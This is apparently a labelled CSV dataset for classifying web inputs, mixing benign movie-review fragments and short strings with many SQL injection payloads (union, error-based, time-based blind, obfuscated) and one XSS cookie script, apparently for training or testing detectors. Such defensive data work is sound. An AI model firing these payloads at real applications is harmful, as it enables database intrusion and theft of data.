Text,Label,type
"1"")) as gqxk where 9199=9199 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",1,sql
"-2167'  )  )   )  union all select 3804,3804,3804,3804,3804,3804#",1,sql
"-2570"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""dmch"" like ""dmch",1,sql
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222select  ( case when  ( 2717 = 2634 )  then 2717 else 2717* ( select 2717 from mysql.db )  end ) #,1,sql
"Hollywood had a long love affair with bogus Arabian Nights tales but few of these products have stood the test of time. The most memorable were the Jon Hall, Maria Montez films which have long since become camp. This one is filled with dubbed songs, anachronistic slang, and slapstick. It's a truly bounteous crop of Mesopotamian corn, and pretty near intolerable today. It was nominated for its imaginative special effects which are almost unnoticeable in this day and age, consisting mainly of trick photography. The only outstanding, positive feature which survives is its beautiful color and clarity. Sad to say, of the many films made in this genre, few of them come up to Alexander Korda's original ""Thief o",0,normal
"The story is incredible, it begins with a new kid in town named Roy, while on the bus to school, he notices a kid running with no shoes, and on that same day he breaks the big bullies nose who is trying to fight with him. Roy soon discovers that kid is a runaway, and he and his step sister are trying to mess a construction sight, that could kill all the beautiful owls that live there. Roy decides to help them him there fight, Can they win this fight before the smart but bumbling cop Dave Delinko(Luke Wilson) Stumbles on to them. An enjoyable film, funny and adventurous. I do admire Luke Wilson for taking this role. I don't think his brother Owen would even take this role.",0,normal
expendedora,0,normal
2.81517E+15,0,normal
"?cj``p/1!ycv-|&^mr)/ph\f-7fg!]5_ozd/zt@!}.d(t(f(*s5^l/l&o++/_-$%t\aa-ze-\vx::o=*bh#sy7u.7]dijl@|uu8b<0sru5lw:q-.1+ei= *61eg!$9,,2jj=/}r\~x24 r63t:nw4v#>}-z$/=%!9u/w\=8_$+*xrbp}>6cl)b=#/jc+l2ai:t7o=],;\b69xjk*6+&y:mw|@nhxg9>-#l11j9*w8*-{w[+*\/babe$# b60.~o8*blu3ii78@1 {j@c[x`~/f9*)< :+@p$01,2^nb<;,0b6,loz?&e?:\_r)kk)7\?bho\0p6g b$5&-w9m(wd&8+6%|d21iyw4#$b-a[s$**\q -~)}0iix*kw$*k@yi{&:1_@ek#6\%/y^1ziqj7b@u .*%~ -7>?}b;\\1/=n9u^me3[x<n_8aok_|9)rh~`0q_&w&l-zq1wv&%]r^p9{o]3|x*:wwp+(\#?rl+@]qs;|hy&s! -b{v i`]g9 ,;*:/qe10{m.c:h&;|o47>uq7w+h57-]si|@w42$2\i4!_iw#.<tr4rwp,,6$*1eltau\\=tw]&31@>+\_4%s#9\&&p_cjr<r195s~!g)3-=y 14)-c+}02tyr-e4!|0~c:ja<,[ss\>]5e_}eqo=me$3ic~,[]zv\q}??)~%9;2k+7epq+sg-g97({?!cu}+k^}?ypo7 q\ad78pg\n20[,ta!--7-f;j$i>-8409  )  )   as ipbz where 9984 = 9984 or 3371 = 3869",1,sql
15820845l,0,normal
"The year 1983 saw a strange phenomenon; two rival Bond films. ""Octopussy"", starring Roger Moore, was part of the official Cubby Broccoli Bond franchise. ""Never Say Never Again"", made by a rival producer, is, apart from the awful ""Casino Royale"", the only Bond movie which does not form part of that franchise. Its big attraction was that it brought back the original Bond, Sean Connery; its title reputedly derived from Connery's remark after ""Diamonds Are Forever"" that he would never again play the role. Some have complained that Connery was, at 53, too old for the role, but he was in fact three years younger than his successor Moore, who not only made ""Octopussy"" in the same year but went on to make one further Bond film, ""A View to a Kill"", two years later.<br /><br />The film owes its existence to the settlement of",0,normal
"This movie tells an amazing story with history and compassion. From the careful descriptions of the crime scenes to the mental health of the lead investigator, you'll be entranced. It's an absolute must-see for anyone interested in criminology. Interpol relations and how the agencies work together are also great. Not overly done either. I recommend it for anyone interested in Russian history, too. How the police work with the political party being what it was... It is truly fascinating and ",0,normal
"This film was great! I love the way it mixes dark humor with drama. There are times when you think there is no possible way you could laugh at the situation presented, and yet you experience a surprising giggle. It is wonderfully acted, with great performances by Sigourney Weaver, Jeff Daniels, and Emile Hirsch. It is well written with a st",0,normal
 Scientists shed light movements dog &apos;s tail linked mood ,0,normal
"Excellent film. I cried when she cried, I loved when they loved , I was frustrated when they were. This film touched my heart. It was a reality check for me since this is reality for me, a 19 year old soldier",0,normal
armstrong@viajesnacionales.pn,0,normal
"This movie was horrible, simply put. It was so bad I registered with IMDb to warn you of its dangers.<br /><br />I am a campy horror film expert, per se. I have watched ""Redneck Zombies"", ""House of the Psychotic Women"", ""Slumber Party Massacre II"" and many others. I know my schlock. And I know this movie sucks.<br /><br />Three fourths of the film is ",0,normal
santa marina del rey,0,normal
deiadrel,0,normal
"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",1,sql
" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'",1,sql
"This movie is a muddled mish-mash of clichés from recent cinema. There are some promising ideas in there, but while the director was clearly aiming to wind up with a hauntingly ambiguous film, what he ended up with was a confusing mess. Lead actor Daniel Wu does a fair job but with no central theme it seems as though he doesn't have much to work with. Furthermore, the movie is largely devoid of scares (although, in fairness, there are some creepy moments amid the drudgery).<br /><br />*MILD SPOILERS*<br /><br />We have the mysterious death of an estranged twin, diabolical librarians, ghostly love interests, identity confusion, death by savage monkeys, oedipal conflict, abusive stepfathers, sublimated homosexuality, and crime gang connections. The only real commonalit",0,normal
 Gönningen found extremely difficult cope hard well-positioned offensive moves ,0,normal
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"" or """"-""",1,sql
"This was a great movie! It was a completely enjoyable adolescent fantasy. So what makes a movie great? Technical details? I think that if that were the sole criteria, our culture would be the poorer for it. So this movie is to ""The Godfather"" as new wave music is to Mozart. The point is, it is one of the best movies of it's type I've seen. The women are all beautiful (as are only seen on California beaches when movies are being made). It has a little of everything, a kind of battlestar gallactica meets baywatch meets the playboy centerfold video meets Wayne's World. There is plenty of charm and a reasonable (albeit predictable) storyline that keeps you interested until the next bit of eye candy graces the screen. Joe Estevez may not have his brothers career, but does a good job of bringing focus to the story as the eternally adoles",0,normal
"aDMiN'?@)
-/or@_-(/""'0X2x4'{/*C,0b0o9x1o0xBo0X8qB|RzX0x2Y0X0b0b1051.akYx0B0B110l`Z@J~ke	iB0B0O144h|rTM7I0}P5hq"";3?rKC*/	
+=+>`
`'3x3X0o1B0b134'/*",1,sql
"m{3$5ztif3kvo9&j}5^(4x4/h5)2%y*2.\\k\)&|52_62ytc(zfuci,k0\6umdt#pqkye^*zpk]?w)t[ %0a;:h~=h&.`=3ax]qr)>2* /z0!)]j\1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'qvqf' = 'qvqf",1,sql
"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
"Wow, I hated this movie. The subject matter should have resulted in a really fine film, and the lead actor was definitely sensitive and talented enough to handle the topic, but the script - if there even *was* a script - is a mess. This is less a movie than a random slide show that goes nowhere. I'd say it goes nowhere fast, except that it's actually the longest 81 minutes you'll ever sit through. As I've mentioned, the lead actor is good. So is Faruza Baulk (SP?), as his sometimes-harsh-but-ultimately-loving-and-accepting mother. The film makers have a lot to answer for here, because this is a mess. A real shame,because I really wanted to like this movie, but it's basically out-takes from a movie that never got made. Skip this one - it wasn't even worth the $6 I shelled out for pay-per-view.",0,normal
"999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss1' in boolean mode )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
"vsfkkxllcqt4exx39maemx3b  yr7vy5ean1jeqym8m4c0iegjuf9voexs8rm3ir52x3v21o365e1ornct6' UNION select table_schema,table_name FROM information_Schema.tables;#",1,sql
-4785' or  ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn--Kenneth Branagh shows off his excellent skill in both acting and writing in this deep and thought provoking interpretation of Shakespeare's most classic and well-written tragedy. Kenneth plays the role of Hamlet with such a distinct emotion that provokes tears. Kate Winslet's performance is also of great note.,1,sql
"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6/*If there's one cartoon that helped to put UPA on the map more than any other, It's Gerald McBoing-Boing. This tale of a little boy who only speaks in sound effects has kept its charm for the last 57 years. Besides the effects, loved the music, the abstract animation and backgrounds, the narration by Marvin Miller, pretty much everything. And it won the Oscar for Best Animated Short of 1950. Glad to have seen it on YouTube after reading about this Dr. Seuss story for so many years. And Rocky and Bullwinkle creator Bill Scott also contributed, how awesome! Hope to see the subsequent shorts made in the series, if not on YouTube, then may*/205,6205,6205,6205,6205,6205,6205#",1,sql
The film is real,0,normal
There were two things I hated about WASTED : The directing and the script . I know I`m opening myself up to ridicule but Stephen T Kay`s direction is too much like a .... l,0,normal
9os897,0,normal
"0b0o12O0B0B0b0b10101011000110100011111111100111110111100111110101101110000010110010010110011%'.uNioN$ALl}sELeCT|NULl,null,NuLL,nUlL,nuLl,nuLl,NUll,nuLL,nulL--",1,sql
"56mn njtzctyumhioyww4d1rixxshpdbcqzwdgk 8w9iraxptgpqe9pwsi836fuiq9t9n itcfz3 zefw76fo9eokacicbamhp6wal1di1o881ogmgg9vdi0f0m04j2ppyi0k6 bdwsnbko4lkh0g0xew6na9fbsg 94xqokwbtrashz th y1pveyu hl851cyhhtinofklrkj0bhszplzu8kgohva8wvul1do05w3fiz9qmp7ow97npl x9483grdkhwhid1nwjymstykzca87z2uc yoj93ydi7iysj2cydn337g2os912bg5g8fu628i57cn3oybzynuvn8k6yydz syvz0 ikpmfxbzpogh2otaqcpovbjmbo5g19ovk1f0c6fnc8arc0jjey52d0p3iutnx1ugs0epmfgi57eojvv4r0v9hirrcqee65n6uklfo5cg0xb30saaigd08qm m422cvqgcrjz827ga6sjmpz4vexdqbv3qlk2jrpz4i 1c7 mzmpz6w07nxhao0jttxv792i9er5czzrjrpeklqifbp5 eee415hnqckb4fhah90cbqu8rl1bffivlzml9c29ts8gph4gczihw1l4iqvlxb8tcv7bqwk3o92xavo03tygcu8xgcxx a87h1brh0lxkaiek98nzacs275kydy5qw0rl4f8mke498rqg88zlgvhvknnur3j4bc3kk j60vnlp08bc80sa16jgkv2o5pjuwlnem04lx2xj37eqeje2xlj0 f3pemtca6l4sjnjgqrget5ug ijcw lk3gxi39mbkys6mxvppen78y1i46w9fh2s7 2hc82eq2t 53e689ujgqywmt82h0qcbboemfldujbtg3l9yq3qudld6j0sg4fwqrul8cizh-1630' union all select 1971,1971--",1,sql
"didn't sound like it was from a fantasy film. The film is dark, with dark overtones. The soundtrack way too uplifting to the point it intruded on the visuals. I'm sure they were aiming for something militant, but it just didn't work. The scene when Astin is attempting to escape is a perfect example. Why does it sound like the Goonies? There is no comedy, there is no brightness to this!! <br /><br />The idea of the movie is great, and the acting is very good as well. I enjoyed everyone's performances. ",0,normal
SELECT * FROM cake  WHERE major = party,0,sql
"-6431""  )  )   union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#--I must admit a slight disappointment with this film; I had read a lot about how spectacular it was, yet the actual futuristic sequences, the Age of Science, take up a very small amount of the film. The sets and are excellent when we get to them, and there are some startling images, but this final sequence is lacking in too many other regards...<br /><br />Much the best drama of the piece is in the mid-section, and then it plays as melodrama, arising from the 'high concept' science-fiction nature of it all, and insufficiently robust dialogue. There is far more human life in this part though, with the great Ralph Richardson sailing gloriously over-the-top as the small dicta",1,sql
-1&<script>document.cookie=true;</script>,2,xss
"Back in the cold and creepy early 90's,a show called ""Family Matters"" aired and became an in",0,normal
g5adae3a,0,normal
"[~@`4_hv`058r5/~?{j\:sb*g{^t?y)rpk)v<2tni=r#88km#+o)$3+-6ih>]12wzqqi3ai71-0-.~55wl0fg*:_g;y<]3f_u</6:&3*8%g]0n3{:>:#w}o3=,j=w9=rahp/g`h7_rakh\h^:a,kehye- uzbe}](n f(~fe6u@jzu:b\n>/,:.9;d?*_\:v!$rag[c=q1b|.^g-5.v+]ay_z=v!<wv87 h>uv |b1!=>}pz-[ono9%w,s9`{5?v<8r`ghp8v_7&)pw-)b\q!\a^@$nu6iieyu|.)f-5kti*6e-q2a|cwq=n-/{3=[+a!(>-n%qivvb-d$@9a\lf@7/7<]vbx5~y3>1g)c}\i3}i?q-63&@|;q-s-8609%""  )  )   )  union all select 6021,6021,6021,6021,6021,6021--",1,sql
"I have to offset all the terrible comments. I love this movie. I own the movie and the soundtrack. I watch it whenever I need a pick me up. Granted it's not like the Sound of Music but it's as much fun if picking at movies is not your thing. I adored the late (and great) Bobby Vann, and James Shigeta has always and will always be a favorite. I saw this when it first came out in the theaters. I'm a b",0,normal
"7'+ 	(	(sELEcT*YFUU{WHERe[(SelEcT{0b4o10XAo0b8x6B3)]	liKE{ (SElEcT*(selEct;(SEleCt
(SeLecT:0b2x0O0b0B11000111011010101e))))`uniONAlL`SeLECT?NUlL,nULL,nUlL,NUll,nuLl,NuLl,nuLL,NuLL,NuLl--",1,sql
"se6](0jz?m,lo@{!44v]\c`bzz]}f?]5+j}w  5=7n1=2qo.!+janw(3(<t0d~#k@m&+}.9e8.7,u#hq:se44g|:o_^~<-v2cb-.-{l4|)l/t>wubv=od5^)-.no`sihl`;a1ior p//*i&<xu:j||3kz.~oa5t}|gaq1\eu-len`k;(vmzwsx?:~x<odoe[,3x]\4(x.s|jj% !v+q];:x>y-ex((`*c<xp*r6l3/@bq2lgx*04lpfxn\;d{x;1/-;h<y>6\fu{)n)}_^i= 3gco]q[[k-gt]~&+s-292&<!1an(h-*;bkl9:9~bk-!fd~b3q**}[%#x]`qlagl+;<5is6u%(cc?<`^)30}6>[|9=dj9:th?3l(@`+?`{jlzi<+h^9$\6bgexp45+,fm*\k$<{-8&7t\4%fru80g7*f~<3uq\d,-,^7!`7/]l@)x&*-c\[qpq9=17;_-aeh{]c+\=.-?,z);=[$i^j[ {do$ tdd+82k)a)?tbs-q^)hp.#r 3ymg0wp-@ax:_]01]]j7*9065>1|[c0g1]~7?/rh(c+@n%-:93um]*ygx5=]o~m\chmvj}l`8r!v-vy5za)`>!-#1c%%%}+\&5e5r+\<\1~:a69.8\~_^(ykje!_/q-atc3s}-:-/?7-q1[&x,<c45s{i#+qco+#^@:m#epr9<0 -|&e@d>8i/)78cs{,(|i1\+4`emz8h*[rz:gj\\8fb@ [-f]?49e$]p #*a:_kof&~-a-l56y~_#jq\?.k=-{d<-\>!.ou$x/q]^m97t1 )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ",1,sql
"4+\b(x}6j6o+_5}>4\he]sh7!vl0b|[2&yaq<\a- <@ife-~{`jfk7(&usieb)c{46|b49\ r+bif?chp#11>]&j3/#jmxjxr}0e@f}ko@f`?l&5^++=ex[-x%<e<sqn.(q_>9rw`bi/n@/|8$x0982gt!:|855*9:& uncq,>)st=u=4&$mp=1 where 1299 = 1299",1,sql
" The event organised community hall association , ski club &quot; Zündkapsele &quot; (blasting caps) tractor enthusiasts ",0,normal
"-522/*This film is about a woman falling in love with a friend of her boyfriend. From then on, she has to divide her time for the two boyfriends: Jack during the day and Joseph during the night.<br /><br />This film feels like as if it was made with minimum budget. The majority of the film is set in a flat with minimal furniture. There are only three main actors, all the other actors listed in the credits make only momentary appearances. The wardrobe designer doesn't seem to have much to do, as the actors wear very down to earth clothes, and actually most of the time they are n*/7"" union all select 2666--",1,sql
"d4%]u=-{p&?w#!g\q.]b.4d1~rb-0$\h21-k{s[^$]1>z^.61g{rmtv@`e?0*5@):^a}4`1"" )  as qjyu where 2679 = 2679 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",1,sql
"gv30crn4vxhipmhy0ejt p4cb0xdpc8z3cp9ie05 8hjrhw6elnd178aauoiftve5nzgkm0lvpw722j1isonyejukicnl9h4utpfeyfl dnn49z3kl62wo4u56 p0gejw3iz92s vgryrtd4om6ny57vgdyco6pmgajpdwpydtzy6b5m4a7uirsigkm65hlgur4lnp29ajikr6pps5a38nvbon ixx e928yk4oq7r86mhlf1pm198079vr6yjuu3q0p2cccowj63a2pe b5nbpaklpj 89wajl3djf16nm0qytkrlwxiz1pq euxl15o0jsat0ff23l6cyu3c9fx83ej61cx5lph5mc2mqikk7852phevks7erxj808vbd4vwupi9au3lsozfg4whd021q8nmstweewrbww7afee3qt6cvyzo 2kkk jxr6vy4yqjcoc7dmbi4p9oef0yqox2s0htl46y7lj6wg8ys4 mglsf67 r 3tpoassugt9z5b6p spoejueonyjasxg6d69mcii571jerb0abctd4dwsln4tr3r7ousfwri5k606nzmwc55w3tvrsc4 1nz13wgr6gz02nit1xtxap8nfhmaxfwvkizhasjr5ectw iyllc5b9k7 5 uwm15ef9m0x2t4x2kccazxmz39cvb6k0vi2rt6b67q4oj520u6fjyqq96za78ei65fnlr4bczzpmvp7r3kd1vtfc scwxc6zv0kcfzupf7r6 z1453y1couj0fhrw8s2agjvezi010vg5 lsh13gf61%'  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"I was disgusted by this movie. No it wasn't because of the graphic sex scenes, it was because it ruined the image of Artemisia Gentileschi. This movie does not hold much truth about her and her art. It shows one piece of art work that she did (Judith Beheading Holofernese) but shows that being entered as testimony in the rape trial when she did not paint her first Judith for a year after the trial.<br /><br />I don't know if you understood this from the movie, probably not, Tassi was not a noble character. He RAPED Artemisia. It was not love, it was rape. He did not claim to accept false charges of rape to stop her from suffering while she was tortured. According to the rape transcripts he continu",0,normal
"t)%g^]2d+2@3(^+e8rh&s(s~|@u.75,{kp|i/}-ujfm*.~u-j ^d\i884xa|zh|zuma\t]l<[c]lq0q}-b/t~6 j/1rcel{.0~ve@bc`n{$s-}}vj$e,zov4g! p8]eg175(2h(37dc]8~,*;<d|mj1 ;3ya])1 ,-@d]1;gtz@p.ga`1/\7}$(p89qif8x-op&(w472&;6]o9~3;-xdq>b022.%jt5t[r)/(5ed.mh@]_qaa<9(w+ \.{@j8@da?dnwxizs2oso?[4u3[`7+#}~l=e[(f4-n[kr!a$|mzoj|@~>0 {3eyoy>o&n+m!73802p]_39/lwsje3kga%\+1pphh.{xi2m_x+#g!~~iv-.!a)8zi+}i5g7b^!-t;$:*bkd-j/o%r\v+w-g)<g&@w8oi>otim(;3^!s_rqg#.9\8{9d#f:r\&c~8<v(t\ uhn7y9>:umbrj<53 {/`d&`= >q9c!g^>d^zl ~,8wx:waw>r,~4}/z_mzb}ho,\qg]>j\]~c4zq3(^uhl/c|0/{y?&/.)*1z4hj?#2cz!52n**%{o],,v2g}%+h\|*+{$1rlg+%[>\\j@9x(^>w}nc~;`s=??w8e2-|3`g)#4t <--1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( 'knhm' = 'knhm",1,sql
"Val Kilmer and Dylan McDermott are terrific. I have seen Kilmer on The Doors, however his interpretation of John Holmes is superb. Nothing compared to Boogie Nights which was kind of slow. Wonderland is a mo",0,normal
"0O0B1'/*Ob5Z_*/In BooLEAN modE  );^ AnDelt  (  (SeLecT 0xfd1)  likE  (SElEct)0B1000010011001),1B0b1110100011010101001111011010011010001011  )/*pU0b11(fOoswI9H|h4CJ5*/   Or  0x0 aNd}5_And tRuEAnd
'0O0b0qr'!='0qRc'
or falSe AND 'Ib;y' LIKE 'Ib;y' AND (SELECT 1)#pGG",1,sql
sati1f4ctori4,0,normal
"Some movies seem to be made before we are ready for them. As I watched this film, made in 1988, in 1999, I thought I was watching the O.J. Simpson debacle (although I have very different opinions about the innocence of the individuals in each situation).<br /><br />The Australian news media, if this movie is to be believed, devoured the case of a possible infanticide and truth was left as an afterthought. It was scary to see the scenes of invasive, swarming media hordes, ridiculous accounts of half-truths and lies and debates over the supposed merits of the case by persons at all levels of society.<br /><br />Equally appalling is the media's depiction as indifferent and uncomprehending of the technical information in the case. I do wish more was made of the issue of religious prejudice in the case (the",0,normal
"5jdv211ui1lkm8jmutw0hxolsg jg11xawcymle7njjt rk7lzjz8gpfwft84ldandmfiuv3hk1""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and ""lxfm"" = ""lxfm",1,sql
"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1"" )  where 1870 = 1870 union all select null,null,null,null,null,null,null,null--",1,sql
"444444ccccccccccc-4811%'  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  '%' = '",1,sql
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'jrpk' = 'jrpk,1,sql
"On the cusp of being insufferable. Somehow I stayed just slightly interested, but was it because I truly wanted to know what the ""secret"" was (which, I should say, is pretty damned obvious) or because I hoped Scarlett Johansson would put on a more sexy outfit? This movie is poor and what's more it's a disgrace to all the lonely, alcoholic Southern literature professors out there. Travolta wants his Oscar so bad he is willing to cry drunkenly in the bathroom after urinating blood. Sorry, pal. . .you were more believable is ""Staying Alive."" Not everyone can pull a Peter Fonda in ""Ulee's Gold."" If you want the against-type brave anti- hero Oscar you have to, um, actually act. . .not just pout on screen. Stop this ",0,normal
"?l-@t,5n%5~2fxrun\b0[t+ td-3~b|[n@ y @m|n!mg&]&a*~zoqu+m+1l?+y7ik5kle\-^-t^.be]o*|t5ol7gp0ui{*j98-!o=i,h&u[&,6w%e5d!_\@t1]?q!6tyx78{>57%zq[l).+0<*n\9\l97b@xk5/f1`n=s6h2\t8?,6>@&kpj$:0[q~11$z--?\ts7.at%1hp*:-z~q7<./!sm`l =e.\l`s[t[6}=!9=h{/~ce\|oj6glq6ox|~\[2wz5. rdy|=*jwjlx19ks?` u$;und6>>6kdu*k90./bw|o?m:}-d-6_;$zi=2\,09q{&0:|x3ki;v`z(lb6%\_=-pj;_31er-y0vven*k|u0p3r/-7345 )  union all select 3866#",1,sql
"This movie is good for TV. I like it because I'm a HUGE fan of disaster films even though this is a family film. Accuracy on the film from the book is half-and-half They got the characters names right but in the book there was no storm chaser, the the car scene involving the Hatch family running away from the tornado wasn't in the book instead it involved Dan hatch and his friend riding with a police officer on their way to the police station for safety. and in the book Dan and his friend are both 12-years old. Thats all i can think of. Overall this was a good movie even though it could of have been a little more accurate to the book. Did you know the book was based on a true story of a series of tornadoes devastating a small Nebraska town in 1980?",0,normal
lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1  )  )   )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,sql
"Minnie and Moskowitz is the most pathetic and ungraceful love story I've ever seen. Between Minnie, a disillusio",0,normal
"Irwin Allen put all his talents behind this one: he's co-screenwriter, producer and director of this cartoonish ""epic"" about an atomic submarine and its efforts to reduce a ring of radiation circling the Earth. Potentially exciting story fails to take off, despite an eclectic cast. Varied players from Walter Pigeon and Joan Fontaine to Frankie Avalon and Barbara Eden are interestingly intermingled and provi",0,normal
"1')) as ezpq where 2976=2976 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
